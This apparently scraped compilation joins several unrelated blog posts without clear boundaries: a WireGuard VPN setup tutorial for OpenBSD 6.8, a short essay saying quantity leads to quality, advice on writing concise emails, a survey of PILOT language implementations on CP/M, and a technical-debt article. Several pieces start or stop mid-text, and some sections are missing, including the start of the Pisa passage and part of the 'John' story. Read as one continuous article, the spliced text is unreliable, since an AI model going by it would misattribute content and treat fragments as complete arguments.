your laptop or smart phone, the traffic must go from your device, through
the local network, then through the wider internet until it ultimately
reaches the destination server. Whoever runs the local Wi-Fi or cell
network can see what websites you visit, and if the connection to the
website is not encrypted, exactly what you are sending and receiving
from the site. Further, if the Wi-Fi network is not encrypted (an open
insecure network with no password), then any user on the network can
also read your traffic!</p>
<p>One way to keep your browsing and activity private and secured
from the people on the local network is to tunnel it through an
encrypted Virtual Private Network (VPN). I commonly do this when
using public Wi-Fi at airports, libraries, restaurants, etc. to
secure my internet traffic from potential eavesdroppers. Ways to
obtain a VPN include buying one from a commercial VPN provider, but
this shifts the issue of who can look at your traffic from people
on the Wi-Fi to this provider. Instead, I setup my own VPN (using
<a href="https://www.wireguard.com/">WireGuard</a>) on a virtual private server
(VPS) that I own on <a href="https://www.vultr.com/">Vultr</a> that runs on
<a href="https://www.openbsd.org/">OpenBSD</a>, my favorite operating system.</p>
<h2 id="what-is-wireguard">What is WireGuard?</h2>
<p><a href="https://www.wireguard.com/">WireGuard</a> is becoming the go-to software
to create a VPN. Compared to common alternatives (OpenVPN, IPsec) it
is simpler, faster, and uses modern cryptography (making it arguably
more secure). OpenBSD has had user-land support for WireGuard using
<a href="https://git.zx2c4.com/WireGuard-go/about/">WireGuard-go</a>. OpenBSD 6.8
was released today (2020-10-18) and now includes an in-kernel WireGuard
implementation <a href="https://man.openbsd.org/OpenBSD-6.8/wg">wg(4)</a>. Being
in-kernel, this implementation is faster. It also means we can skip
using extra software and use base-only utilities for simple, easy
configuration.</p>
<h2 id="what-will-things-look-like-at-the-end">What will things look like at the end?</h2>
<p>Your smart phone will enable the VPN through one-click on the WireGuard
app. All traffic on your phone will then go over an encrypted tunnel to
the OpenBSD endpoint server, after which, it will route to the rest of
the internet. This will protect your traffic from anyone snooping on the
Wi-Fi or cell network.</p>

<p>Below shows configuration for an OpenBSD server to be a WireGuard
endpoint. All instructions below pertain to OpenBSD 6.8 released on
2020-10-18.</p>
<h2 id="network-setup">Network setup</h2>
<p>Below will set-up some background configuration to allow tunneling of
packets and configure the firewall:</p>
<ol>
<li>
<p>Enable internet protocol (IP) forwarding</p>
<p>This will allow packets to move between the WireGuard interface
and the egress interface.</p>
<p>First enable it on the running system:</p>
<pre><code><span># sysctl net.inet.ip.forwarding=1
</span></code></pre>
<p>Then make it be enabled after system reboot:</p>
<pre><code><span># echo  'net.inet.ip.forwarding=1' &gt;&gt; /etc/sysctl.conf
</span></code></pre></li>
<li>
<p>Configure pf</p>
<p>Configure OpenBSD's firewall/packet filter,
<a href="https://man.openbsd.org/pf">pf(4)</a> to open the port for WireGuard,
allow traffic between WireGuard peers, and forward tunneled traffic
from the client to the internet. To do so, add the following lines
to your <a href="https://man.openbsd.org/pf.conf">pf.conf(5)</a>:</p>
<pre><code><span># wireguard
</span><span># open wireguard port
</span><span>pass in on egress proto udp from any to any port 51820
</span><span># allow communication between wireguard peers
</span><span>pass on wg0
</span><span># allow clients connected to wg0 to tunnel their outside world traffic
</span><span>pass out on egress inet from (wg0:network) nat-to (egress:0)
</span></code></pre></li>
</ol>
<h2 id="wireguard-configuration">WireGuard Configuration</h2>
<p>Previous to OpenBSD 6.8, configuration required the wireguard-tools
packages. Now that WireGuard is in base, we can do all
configuration with base utils. This is all nicely documented
in the manual pages ( <a href="https://man.openbsd.org/wg">wg(4)</a>,
<a href="https://man.openbsd.org/ifconfig">ifconfig(4)</a>) and summarised below:</p>
<h3 id="set-up-wg0">Set-up wg0</h3>
<ol>
<li>
<p>Generate a end point private key</p>
<p>WireGuard uses a Curve25519 key that is 32 bytes in length and
base64 encoded. A Curve25519 key needs 5 particular bits to be
configured in a certain way to valid, but wg(4) can correct
this from any randomly generated 32 bytes. Therefore, we just
need a 32 bytes random base 64 encoded string and can use
<a href="https://man.openbsd.org/openssl">openssl(1)</a> for that:</p>
<pre><code><span>$ openssl rand -base64 32 &gt; ep_private.key
</span></code></pre>
<p>This will save the private key to <code>ep_private.key</code>. Keep a hold of
this for now. We can delete it after the set-up is complete.</p>
</li>
<li>
<p>Bring up wg0 interface</p>
<pre><code><span># ifconfig wg0 create wgkey "$(cat ep_private.key)" wgport 51820
</span></code></pre></li>
<li>
<p>Save end point public key</p>
<p>Bringing up the wg0 interface generates a public key from the
private key. You will need to give this public key to the client (your
laptop, smart phone etc), so save it for now:</p>
<pre><code><span># ifconfig wg0 | grep wgpubkey | cut -d ' ' -f 2 &gt; ep_public.key
</span></code></pre></li>
<li>
<p>Assign wg0 an IP address</p>
<p>This IP address will be the IP address your endpoint will have on
the VPN. The OpenBSD endpoint will be reachable at 10.0.0.1
by clients (smartphone, laptop, etc) which will also be on the
10.0.0.0/24 subnet. I recommend picking an ip address range randomly
to prevent any collision between a network you may join and your
WireGuard network (eg 10.12.24.0/24). To keep things simple for this
tutorial I'll just use 10.0.0.0/24 subnet and give the end point the
first IP address:</p>
<pre><code><span># ifconfig wg0 10.0.0.1/24
</span></code></pre></li>
</ol>
<p>wg0 is now set up and functional.</p>
<h3 id="generate-public-private-key-pair-for-client">Generate public/private key pair for client</h3>
<p>Below is a bit of a hack so we can use base utilities only. It brings
up a temporary wg interface with a generated private key just so we can
extract the generated public key.</p>
<ol>
<li>
<p>Generate a client private key</p>
<pre><code><span>$ openssl rand -base64 32 &gt; client1_private.key
</span></code></pre>
<p>This will save the private key to <code>client1_private.key</code>. Keep a hold of
this for now. We can delete it after the set-up is complete.</p>
</li>
<li>
<p>Bring up wg1 interface</p>
<p>Note, I'm picking a different port (this can be whatever you want)
since wg0 is already up on 51820.</p>
<pre><code><span># ifconfig wg1 create wgkey "$(cat client1_private.key)" wgport 51822
</span></code></pre></li>
<li>
<p>Save client public key</p>
<p>You will need to use this public key on the OpenBSD endpoint in
order for the client to connect. </p>
<pre><code><span># ifconfig wg1 | grep wgpubkey | cut -d ' ' -f 2 &gt; client1_public.key
</span></code></pre></li>
<li>
<p>Remove the temporary wg1 interface</p>
<p>This will remove the temporary interface we created to extract keys:</p>
<pre><code><span># ifconfig wg1 destroy
</span></code></pre></li>
</ol>
<h3 id="finalize-setting-up-openbsd-endpoint">Finalize setting up OpenBSD Endpoint</h3>
<p>Now that we have the client's public key, we can establish a WireGuard
peer on the endpoint to allow the client to connect:</p>
<pre><code><span># ifconfig wg0 wgpeer "$(cat client1_public.key)" wgaip 10.0.0.2/32
</span></code></pre>
<p>This will limit the IP address of the peer to 10.0.0.2. Changed the IP
address to the IP address you would like on the subnet you picked.</p>
<h3 id="enable-configuration-to-persist-on-reboot">Enable configuration to persist on reboot</h3>
<p>With the above instructions, your endpoint works. However, it will not
work once you reboot the operating system. Save this configuration with
the below text in <code>/etc/hostname.wg0</code>:</p>
<pre><code><span>wgkey REPLACE_WITH_EP_PRIVATE_KEY wgport 51820
inet 10.0.0.1 255.255.255.0
wgpeer REPLACE_WITH_CLIENT1_PUBLIC_KEY \
        wgaip 10.0.0.2/32
</span></code></pre>
<p>Making sure to replace <code>REPLACE_WITH_EP_PRIVATE_KEY</code> with the text stored
in <code>ep_private.key</code> and <code>REPLACE_WITH_CLIENT1_PUBLIC_KEY</code> with the text
stored in <code>client1_public.key</code>.</p>
<p>Make sure the permissions for <code>/etc/hostname.wg0</code> are correct so users
outside of root and those in the group wheel cannot read the keys:</p>
<pre><code><span># chmod 640 /etc/hostname.wg0
# chown root:wheel /etc/hostname.wg0
</span></code></pre>
<p>Now, after a reboot OpenBSD will bring up the WireGuard endpoint for you
automatically.</p>
<h2 id="smart-phone-configuration">Smart phone configuration</h2>
<p>With the endpoint set-up, now you just need to configure your smart
phone to use the tunnel. The authors of WireGuard provide apps for both
<a href="https://play.google.com/store/apps/details?id=com.wireguard.android&amp;hl=en_US&amp;gl=US">Android</a>
and
<a href="https://apps.apple.com/us/app/wireguard/id1441195209">iOS</a>. These
applications make configuration easy. You just need to take a photo of a
QR code made from a client.conf that you can write on your computer. The
client.conf should have the following contents:</p>
<pre><code><span>[Interface]
PrivateKey = REPLACE_WITH_CLIENT1_PRIVATE_KEY
Address = 10.0.0.2/24

[Peer]
PublicKey = REPLACE_WITH_EP_PUBLIC_KEY
AllowedIPs = 0.0.0.0/0
Endpoint = OPENBSD_EP_IP_ADDRESS:51820
</span></code></pre>
<p>Make sure to replace <code>REPLACE_WITH_CLIENT1_PRIVATE_KEY</code> with the
contents from <code>client1_private.key</code>, <code>REPLACE_WITH_EP_PUBLIC_KEY</code> with
the contents from <code>ep_public.key</code>, and <code>OPENBSD_EP_IP_ADDRESS</code> with the
IPv4 address of your OpenBSD end point.</p>
<p>Next, generate a qr code with this information using the <code>libqrencode</code>
package. If you do not want to install a package outside of base, you
can enter the above info by hand into your phone instead. Then do the
following to create the code:</p>
<pre><code><span>$ qrencode -t ansiutf8 &lt; client.conf
</span></code></pre>
<p>If you have issues taking a photo from the QR code generated in your
terminal, you can also save it as an image and take a photo of the
image.</p>
<p>Open your WireGuard application and take a photo of the QR code,
and the app is now configured! Toggle the switch in the app
to turn it on. To verify it is working, go to a website like
<a href="http://icanhazip.com/">icanhazip.com</a> to see your IP address. It should
change when the WireGuard tunnel is up to the same address as your
OpenBSD end point.</p>
<p>Once everything works, if you want, you can delete the key files and client.conf:</p>
<pre><code><span>$ rm {client1,ep}_{public,private}.key
$ rm client.conf
</span></code></pre>
<p>Enjoy securely tunneling your traffic with WireGuard!</p>

<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>There isn't a more dramatic love/hate relationship in professional communication than we have with emails. There are at least a dozen emails we all regret hitting "send" without looking over one more time. The static nature of its inability to edit calls for precision in writing and clarity to what you're trying to achieve.</p><p>As <a href="https://waitbutwhy.com/2013/12/11-awkward-things-about-email.html">Tim Urban</a> said before, not having an email today would be the equivalent of not having a phone number. Everything goes through email. But more importantly, Email is how we communicate for work. It is the lowest common denominator for every working professional in the world to communicate.</p><p>This is why we all need to be writing effective emails. Writing better emails allows us to do more things with less time (fewer threads) and keep our minds focused on important things.</p><p>Throughout my career with IBM and Walmart, and now with Hyperinbox as a founder, I've read tens of thousands of emails that could have been written better. I've written emails that I wish I could take back and write them again.</p><p>From my learnings on email, I have two pieces of advice on writing better emails. Aside from fundamental grammar and formatting, these two learning points have served me well thus far in handling email communication.</p><p>I've also read others' take on writing better emails. There are literally guides, books, lectures, and seminars on how to write a good email. You can look at them, but I think at the core of any communication, the most important factor to consider is putting yourself in the shoes of your audience. Hence, the two ways of writing an effective email:</p><ol start="" role="list"><li>Brevity and cutting through the chase</li><li>Communicating your agenda/goal in the email</li></ol><h3><strong>Brevity is a sign of respect. Get to the point.</strong></h3><p>Many people tend to write lengthy introductions before they talk about why they're sending the email in the first place. They usually start with a greeting, then assures they hope you're doing well, talk about the weather, then go through a whole bunch of B.S. before they finally write the ask.</p><p>‍</p><figure><p><img src="https://uploads-ssl.webflow.com/5f6bafe1ce94407594a1c388/5f8f68ef2ff8472fafcd6721_Screen%20Shot%202020-10-19%20at%2014.05.18.png" loading="lazy" alt=""></p><figcaption>COVID-19 version.</figcaption></figure><p>As a busy founder, and this goes for any professional, email has become too much of a distraction, and all we want at the end of the day is a clear, empty inbox! And these fluffy opening statements don't help.</p><p>Keeping your messages short, concise, and straight to the point is a show of respect. You’re mindful of the reader's time. You are putting yourself in the shoes of your reader. Your reader doesn't want to read all of that opening statement. She just wants to get to the point.</p><p>If you respect other's time, send a concise email. Keep it short. You don't need "hope you're doing okay" or "how are you doing?" added to your email every time. I've also seen "I know you're a busy guy" or "since we know you're busy with everything." These are formalities that satisfy no one.</p><p>We include those as a courtesy and because we don't want to sound rude. But I would rather read a cold but short and concise email than go through a 300-word heart-warming essay.</p><p>Here's an example:</p><p><code>
To: chris@pixelic.io<br>
From: james@company.com<br>
Subject: (subject untitled)<p>

Dear Chris,</p><p>

Hi! I know you're busy, so I'll make this quick.</p><p>

How are things? I’m currently working in Chicago and it’s been great! Summer is coming, so can’t complain too much about the chill weather right now.</p><p>

Anyways, I’ve been meaning to ask you for an introduction to John Doe from Company X I found him on LinkedIn, and it seems you are well connected to him! I’m working on a new project and I think John could help me out on X. </p><p>

Let me know if I could be of help with anything!<br>
All the best,</p><p>

James</p><p>

VP of Marketing | Company X<br>
Email: james@company.com<br>
Phone: +1 (650) 123-1234<br>
LinkedIn | Facebook | Twitter</p></code></p><p>What if you can trim all of this down to this:</p><p><code>
To: chris@pixelic.io<br>
From: james@company.com<br>
Subject: Intro request<p>
  
Chris, can you introduce me to John Doe at Company X? I found him on LinkedIn and seems he can help me out on a project I'm working on.</p></code></p><p>Here's how you can trim your email:</p><ol start="" role="list"><li>Write shorter sentences.</li><li>Stay away from fluffy, ambiguous words</li><li>Talk direct.</li><li>But don't be an asshole - you do want to write long whenever necessary. Know when to write long.</li></ol><h3><strong>Communicate your agenda clearly.</strong></h3><p>Naval Ravikant, co-founder of AngelList, has a great template for rejecting meeting requests. Let's admire his template for a few seconds:</p><p><code>
Hey {{ first_name }},<p>

Just want to be upfront.</p><p>

I don’t do non-transactional meetings. I don’t do meetings without a strict agenda. <br>
I don’t do meetings unless we absolutely have to.</p><p>

Naval</p></code></p><p>Although I admit my heart would start pounding if I ever receive an email like this from him, this is how strict people should be about protecting their time and focus as they are finite resources that can be only used a set amount each day.</p><p>And the fact that I'm thinking my heart will pound if I ever get Naval's email tells me that I shouldn't be asking for things without setting a clear agenda for the requests that I make through email.</p><p>To be effective and get the most out of your emails, always clarify what you're looking for. Be clear about your motives. Outline what's in it for the reader as well.</p><p>Another part of communicating your agenda clearly is to write the "so what" before anything. Here's an example, though not an email:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f6bafe1ce94407594a1c388/5f8f69c254117f7899006f2d_P4-xnIpw.png" loading="lazy" alt=""></p></figure><p>This is Mark Zuckerberg's Facebook post a few months ago, calling that health workers need more protective gear. See how he started his "so what" first and then laid out the details? This is what effective communication looks like.</p><p>In your email, do the same: write the "so what" first, and then lay out the details that support your point.<br></p><p>‍</p><p>--</p><p><em>If you are remote, and want a universal inbox that integrates with all of your daily apps (Figma, Slack, Github, Jira, Asana, etc.), </em><a href="https://www.producthunt.com/upcoming/hyperinbox"><em>join the Hyperinbox waitlist</em></a><em>.

October 22, 2020 | https://techtinkering.com/articles/the-pilot-programming-language-on-cpm/ | <a href="https://web.archive.org/web/*/https://techtinkering.com/articles/the-pilot-programming-language-on-cpm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
        <p><a href="https://en.wikipedia.org/wiki/PILOT">Pilot</a> was created by John A. Starkweather in the early 1960s as a programming language for Computer Assisted Instruction.  It has often been compared to <a href="https://en.wikipedia.org/wiki/Logo_(programming_language)">Logo</a> because of its use with children.  However, it is a much simpler language than Logo and really specializes in providing an easy way to create question and answer systems.</p>
<h2>Language Description</h2>
<p>Pilot source code consists of lines of the following format:</p>
<p>[label][command][conditional expression]:[operands]</p>
<p><em>Labels</em> are prefixed with <code>*</code> and are used by <code>J:</code> to Jump to and by <code>U:</code> to call a User subroutine.</p>
<p>Common <em>Commands</em> are listed in a table below.</p>
<p>The <em>conditional expression</em> is generally <code>Y</code> or <code>N</code> to indicate whether to execute the command based on the last <code>M:</code> Match command.  Some implementations of Pilot also support more complicated expressions.</p>
<p>The <em>operands</em> for a command are delimited by commas.</p>
<div><table>
  <tbody><tr><th>Command</th><th>Action</th></tr>
  <tr><td>A:&lt;Variable&gt;</td><td>Ask for keyboard input and put result in <em>Variable</em></td></tr>
  <tr><td>C:&lt;Expression&gt;</td><td>Compute <em>Expression</em></td></tr>
  <tr><td>E:</td><td>End user subroutine / program</td></tr>
  <tr><td>J:&lt;Label&gt;</td><td>Jump to <em>Label</em></td></tr>
  <tr><td>M:&lt;List&gt;</td><td>Match last keyboard input against any value in <em>List</em> (Set Y/N logic flag)</td></tr>
  <tr><td>R:&lt;Comment&gt;</td><td>Remark / Comment</td></tr>
  <tr><td>T:&lt;String&gt;</td><td>Type <em>String</em> to display</td></tr>
  <tr><td>U:&lt;Label&gt;</td><td>Jump to a User subroutine at <em>Label</em></td></tr>
</tbody></table></div>
<p><em>Variables</em> are prefixed with a <code>$</code> if a string and for those implementations that support numbers they are generally prefixed with a <code>#</code>.</p>
<h2>Example: Looping Hello, World!</h2>
<p>This example prints 'Hello, World!' ten times with the number prefixing the string.</p>
<pre><code>         C: I=1
*LOOP    T: #I Hello, World!
         C: I=I+1
         C: J=11-I
      J(J): *LOOP
         E:
</code></pre>
<p>The line to print the message, <code>*LOOP    T: #I Hello, World!</code>, uses <code>#I</code> to reference the variable <code>I</code>.  The loop is controlled by the line <code>J(J): *LOOP</code>, which uses a conditional expression, <code>(J)</code>, to indicate that the jump should be performed if 'J &gt; 0'.</p>
<h2>Example: String Matching and Subroutines</h2>
<p>This example demonstrates string matching and subroutines as it repeatedly asks a user to type <code>STRAWBERRIES</code>, <code>QUIT</code> or <code>EXIT</code>.  If the user types <code>STRAWBERRIES</code> it will tell the user how much it likes them with cream  and if the user types either <code>QUIT</code> or <code>EXIT</code> it will exit the program.</p>
<pre><code>*LOOP     T: TYPE STRAWBERRIES OR ELSE (OR QUIT OR EXIT)
          A: $FRUIT
          M: QUIT,EXIT
         JY: *QUIT
          M: STRAWBERRIES
         UY: *ILIKE
          J: *LOOP
*ILIKE    T: I SURE LIKE $FRUIT AND CREAM
*QUIT     E:
</code></pre>
<p>The line <code>A: $FRUIT</code> accepts a string into the variable <code>FRUIT</code>, which is then tested to see if it matches either <code>QUIT</code> or <code>EXIT</code> using <code>M: QUIT,EXIT</code>.  The <code>M:</code> command sets the logic flag which is then tested with <code>JY: *QUIT</code> and if it is true (Yes) then the program jumps to the label <code>*QUIT</code>.  If not then the accept string is tested against <code>STRAWBERRIES</code> and if it matches then the subroutine <code>*ILIKE</code> is called with, <code>UY: *ILIKE</code>.  The <code>*ILIKE</code> subroutine refers to the accepted input string through the variable <code>$FRUIT</code> in, <code>T: I SURE LIKE $FRUIT AND CREAM</code>.  Finally <code>E:</code> is used to exit the subroutine and doubles as the program quit indicator at <code>*QUIT</code>.  Unfortunately, for some reason <code>E:</code> doesn't seem to exit '8080 PILOT' properly.</p>
<h2>8080 PILOT</h2>
<p>8080 PILOT was written by John A. Starkweather, the original author of Pilot, under contract to the Lister Hill National Center for Biomedical Communications, National Library of Medicine.  This was ported to CP/M by John I. Frederick in 1977 and v1.2 is available on the Walnut Creek CD in <a href="http://www.classiccmp.org/cpmarchives/cpm/Software/WalnutCD/simtel/cpmug/cpmug012.ark" title="CPMUG012.ARK">CPMUG012.ARK</a>.  Although the version number of the executing program states v1.1.  Interestingly, although this version was released in 1977, John Starkweather says in the March 1982 edition of InfoWorld that <a href="https://books.google.co.uk/books?id=fz4EAAAAMBAJ&amp;pg=PA47&amp;redir_esc=y#v=onepage&amp;q&amp;f=false">he is <em>going</em> to release a CP/M version</a>.  There is a <a href="https://archive.org/details/dr_dobbs_journal_vol_02_201803/page/n173/mode/2up">Guide to 8080 Pilot, Version 1.1</a> in the April 1977 issue of Dr. Dobbs Journal.</p>
<p>The examples above are written for <em>8080 PILOT</em>.</p>
<h2>Z-80 PILOT</h2>
<p>Also in the file <a href="http://www.classiccmp.org/cpmarchives/cpm/Software/WalnutCD/simtel/cpmug/cpmug012.ark" title="CPMUG012.ARK">CPMUG012.ARK</a> is a much smaller version of Pilot written for the Z-80.  The source code is only 7k and the .COM file is only 1k, compared to 8080 PILOT whose source code is 67k and .COM file is 5k.  However, this smaller size comes at a cost.  This version doesn't support subroutines or numeric variables.  It also refers to variables in a <code>T:</code> command using a <code>\</code>, e.g. <code>\fruit</code> and <code>A:</code> doesn't accept a variable name, instead it uses the label of the line on which the <code>A:</code> is being executed to indicate the variable name.  Despite these differences for many uses it wouldn't matter much if you just want to present information and question a user.</p>
<h2>PILOT/80</h2>
<p><a href="http://www.classiccmp.org/cpmarchives/cpm/Software/WalnutCD/cpm/languags/pilot80/pilot80.lbr" title="pilot80.lbr">PILOT/80</a> was written in MBASIC by Kurt Albrecht and the version on the Walnut Creek CD is dated 1983.  It contains its own text-editor, although you can use any editor to create the Pilot source programs by saving them with a '.PIL' extension.  Its use of MBASIC does make it slower but that may not be much of a problem because it doesn't support maths through the <code>C:</code> command.  The documentation is good and I like the inclusion of the <code>I:</code> command to accept single key input as well as the <code>S:</code> command to handle screen functions such as <code>CLEAR</code> to clear the screen.</p>
<h2>Pilot/P</h2>
<p><a href="http://www.classiccmp.org/cpmarchives/cpm/Software/WalnutCD/simtel/sigm/vols200/vol237/pilot-p.lbr" title="pilot-p.lbr">Pilot/P</a> takes Pilot source code and transpiles it to Pascal/Z source code.  It was written by David Mundie and Raymond E. Penley and the Walnut Creek CD contains v2.5 from 1984.  This implementation departs quite a lot from other Pilot implementations by having a more complex subroutine definition using <code>%:</code> and allowing Pascal statements to be integrated into the Pilot source code.  It also has additional commands such as <code>X:</code> to process an expression which then sets the logic flag.  One last significant change is that variables are referred to by the <code>T:</code> command by surrounding them with the <code>@</code> symbol, e.g. <code>@$varName@</code>.</p>
<p>Pilot/P contains great documentation, has lots of examples and uses 'SUPERSUB' (renamed as 'DO.COM') to automate the process of transpiling to Pascal/Z source code, compiling and linking.</p>

            <p>As you can see, this is a well-known monument in Italy, more specifically in Pisa, hence it’s name: <strong>Tower of Pisa.</strong></p>
<p><img alt="Pisa Tower picture" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower.png"></p>
<p>This tower has a very interesting history, it was built around the 12th century, but due to the soft ground it was built on, it started tilting. The structure was only stabilized in 2001 after 8 years of remedial work.</p>
<p>Actually, one of the corrections made during these 8 years made the tilting even worse!
Let those who never made a refactoring that made the problem worse throw the first stone. I can’t really blame anyone haha.</p>

<li>John is also an amazing programmer with a lot of years of experience.</li>
</ul>
<p>Suddenly, a new project arrived at John’s desk, and it needed:</p>
<p><img alt="John playing with a ball" src="https://labcodes.com.br/blog/images/tech-debt/chico-features.png"></p>
<ul>
<li>Payment System</li>
<li>Social Network Authentication</li>
<li>Delivery services integration</li>
</ul>
<p>Since John is an excellent professional that always delivers his activities, he tackled the new project head-on and delivered it in time.</p>
<p><img alt="John is happy because he delivered the project in time" src="https://labcodes.com.br/blog/images/tech-debt/chico-delivered.png"></p>
<p>After John’s delivery, the rest of his team went on to review his code, and they discovered a few problems, such as:</p>
<p><img alt="Cat's reviewing John's code" src="https://labcodes.com.br/blog/images/tech-debt/chico-team-review.png"></p>
<ul>
<li>Bugs and inconsistency on payments</li>
<li>Sometimes the deliveries weren’t processed</li>
<li>Authentication was too simple when checking the social networks used</li>
</ul>
<p><img alt="John is sad because his project had some bugs" src="https://labcodes.com.br/blog/images/tech-debt/chico-bugs.png"></p>
<p>John knew his code had a few bugs. But nearing the deadline, another project appeared and it took a lot of John’s time, so he couldn’t go back and fix the problems.</p>
<p>John and his team had to deliver the project riddled with bugs and problems.</p>
<p>But John kept a positive attitude.</p>
<p>“In the future, I’ll go back and fix those bugs”</p>
<p><img alt="John is happy again, he knows that in the future he'll fix everything" src="https://labcodes.com.br/blog/images/tech-debt/chico-refactoring-en.png"></p>
<h3>SPOILER</h3>
<p>C’mon, did you really think that this was going to happen?</p>
<p><img alt="The problems in John’s project" src="https://labcodes.com.br/blog/images/tech-debt/problems-on-chicos-code-en.png"></p>
<p>Let’s dive deeper into the problems of John’s code: </p>
<ul>
<li>Payments couldn’t be processed in different currencies</li>
<li>If the delivery system is offline, the code wouldn’t work</li>
<li>Users with deactivated accounts could still access the system</li>
<li>No automated testing</li>
</ul>
<p>And this, my friends, is what we know as Technical Debt. Why?</p>
<p>Because what happened was that John chose the first solution he could think of in that short deadline, this affected the code’s quality and the team accepted this. In the future, if any logistics of the business, such as accepting different kinds of currency or changing the delivery service, needs to be changed, the <strong>Changing Cost</strong> of the code is going to be enormous. The moment John chose the faster and easiest solution for him was the moment that the Technical Debt was inserted in the code.</p>
<p>What happened with the Tower of Pisa is a lot like what we understand as Technical Debt.</p>
<p><img alt="Picture from the Tower under construction" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower-construction.png"></p>
<p>It probably started off as a couple of small mistakes and problems, but the constructors decided to ignore them and build and scale on top of these problems. The tower was built so fast that these little “bugs” in the construction jeopardized the whole structure.</p>
<p>And the same thing can happen with software. The difference is that the bugs and problems are easier to spot in the developing process, because, after a while, new features become impossible to deliver before um fix these bugs.</p>
<h2>Why is Technical Debt always bad?</h2>
<p>We are used to understanding any Technical Debt in software as a very bad thing. And it usually is.</p>
<p>But we can also see it as a strategic and/or economic decision since a project riddled with Technical Debt is still a project that was delivered fast. It can be a very positive thing for the product.</p>
<p>The problem with this approach starts when we start to forget what we have done in the past. Imagine that Technical Debt is a really greasy and tasty junk food. To eat it once or twice may be wonderful, but after the eighth ou ninth meal, it might be time to acknowledge you have a problem.</p>
<p>By accepting that it is a tradeoff, we can move faster to pay the debt in the future. It really something very normal to do.</p>
<p><img alt="Losing Quality vs. Speed up deliveries" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-tradeoff-en.png"></p>
<p>I don’t know how many of you have paid the cost of too much junk food. Just remember that this cost, as well as in software, becomes higher with time.</p>
<p>If you identified some of these situations in your day-to-day tasks, don’t worry, especially if you have some time dedicated to remedying the problem in the future. This is a really common scenario when dealing with software delivery.</p>
<h2>Technical Debt Quadrant</h2>
<p><img alt="Martin Fowler’s Technical Debt Quadrant" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-quadrant-en.png"></p>
<p>If we look at <a href="https://martinfowler.com/bliki/TechnicalDebtQuadrant.html" target="_blank">Martin Fowler’s Technical Debt Quadrant</a>, we can see John in the upper quadrants, between Reckless and Prudent. </p>
<p>He knew he didn’t have enough time to design the best solution, but he also knew that: In the future, he had to come back and improve his code.</p>
<p>Ok, accepting this as something ordinary, we can try to understand who is really responsible for the software’s debt.</p>
<h2>Who’s responsible for the debt?</h2>
<p>If we focus on the name (Technical Debt), we’re lead to think that it’s a problem made by technical people, namely: the developers, who are responsible for writing the code that ultimately caused the debt.</p>
<p>The problem is that software is the result of the structure and processes of a whole company.</p>
<p>Also, the whole software industry changed since the term “Technical Debt” was born. In John’s scenario, for example, the problem with the not-so-good solution that he crafted is more connected to a management issue, or even to the product team, than to himself. We know John is a good developer, but he had to ignore a lot of problems in order to deliver within the established deadline.</p>
<p>Sometimes the bottlenecks that are creating debt come from different parts of the company, such as:</p>
<ul>
<li>Management team vs Developers speed</li>
<li>Product team not having a long-term plan</li>
<li>UI/UX team too far from the developers</li>
</ul>
<p>But we can’t forget that, sometimes, we are indeed to blame for our own bad decisions.</p>
<p><img alt="John is sad because his bad decisions also affect the project" src="https://labcodes.com.br/blog/images/tech-debt/our-responsability-en.png"></p>
<ul>
<li>Our bad decisions counts</li>
<li>Framework smells</li>
<li>Low test coverage</li>
</ul>
<p>Like when we choose a new and exciting framework, without investing the necessary time to understand if that is the best tool for the job at hand, or even when we stop paying attention to the signs that a framework is being abandoned, or when the developers aren’t testing and refactoring the application as they should… All of this is our fault. </p>
<p>After discovering which problems we have in our code, we need to look for the tools we can use to help us deal with the situation.</p>
<h2>How to deal with the debt?</h2>
<ul>
<li>Rewriting everything?</li>
<li>Hire more people just to deal with the debt?</li>
<li>Stop delivering until we can fix some of the debt?</li>
<li>Creating Technical Debt tasks in a separate Technical Debt board?</li>
</ul>
<p>Imagine if people had simply stopped building the Tower of Pisa and destroyed everything to rebuild. The chances of the same mistakes happening, or even new mistakes, were really high. And consider the amount of money necessary for demolishing and rebuilding everything.</p>
<p>What if the company simply hired more people to fix the debts? In the case of the Tower, we would have people trying to build it higher working alongside people trying to make it straight and steady. This really doesn’t solve the main problem.</p>
<p>In software, hiring a new team to deal with existing problems would mean that the old team would have to take the time to explain the whole context of the software to the new team. And, believe me, this would take a lot more time than you’d think. </p>
<p>And what if we created a new place to store our Technical Debt task? After a while, this place would become completely invisible to the team.</p>
<p><img alt="Comic strip from the process of creating a new tech debt ticket and adding it to a backlog full of forgotten tickets using dead plants as an analogy" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-backlog.png"></p>
<p>If an ordinary developer’s backlog already has its own old and invisible tasks, imagine creating a whole different board with separate tasks. However, these are the solutions most people usually look for.</p>
<p>So, Luan, if these options aren’t the most viable, what can we do?</p>
<p>After what we already know, we must try to find truly viable solutions to deal with the Technical Debt.</p>
<h2>Sustainable solutions</h2>
<h3>1. I.M.P.A.C.T</h3>
<p><img alt="I.M.P.A.C.T cyclic process" src="https://labcodes.com.br/blog/images/tech-debt/impact.png"></p>
<p>IMPACT is a process to:</p>
<ul>
<li>Identify</li>
<li>Mark</li>
<li>Plan</li>
<li>Act</li>
<li>Test</li>
</ul>
